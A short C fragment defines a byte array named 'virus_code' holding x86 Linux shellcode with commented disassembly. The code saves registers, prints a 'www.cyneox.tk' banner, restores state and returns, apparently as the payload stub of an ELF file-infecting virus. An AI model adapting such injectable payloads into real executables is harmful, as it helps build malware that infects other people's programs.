const unsigned char virus_code[]
__attribute__ (( aligned(8), section(".text") )) =
{
  0x68,0x00,0x00,0x00,0x00,      /* 08048080: push dword 0x0         */
  0x9C,                          /* 08048085: pushf                  */
  0x60,                          /* 08048086: pusha                  */
  0x68,0x3A,0x0A,0x20,0x20,      /* 08048087: push dword 0x20200a3a  */
  0x68,0x6B,0x20,0x3A,0x3A,      /* 0804808C: push dword 0x3a3a206b  */
  0x68,0x6F,0x78,0x2E,0x74,      /* 08048091: push dword 0x742e786f  */
  0x68,0x63,0x79,0x6E,0x65,      /* 08048096: push dword 0x656e7963  */
  0x68,0x77,0x77,0x77,0x2E,      /* 0804809B: push dword 0x2e777777  */
  0x68,0x3A,0x3A,0x3A,0x20,      /* 080480A0: push dword 0x203a3a3a  */
  0xB8,0x04,0x00,0x00,0x00,      /* 080480A5: mov eax,0x4            */
  0xBB,0x01,0x00,0x00,0x00,      /* 080480AA: mov ebx,0x1            */
  0x89,0xE1,                     /* 080480AF: mov ecx,esp            */
  0xBA,0x18,0x00,0x00,0x00,      /* 080480B1: mov edx,0x18           */
  0x81,0xC4,0x18,0x00,0x00,0x00, /* 080480B6: add esp,0x18           */
  0xCD,0x80,                     /* 080480BC: int 0x80               */
  0x61,                          /* 080480BE: popa                   */
  0x9D,                          /* 080480BF: popf                   */
  0xC3                           /* 080480C0: ret                    */
}; /* 65 bytes (0x41) */
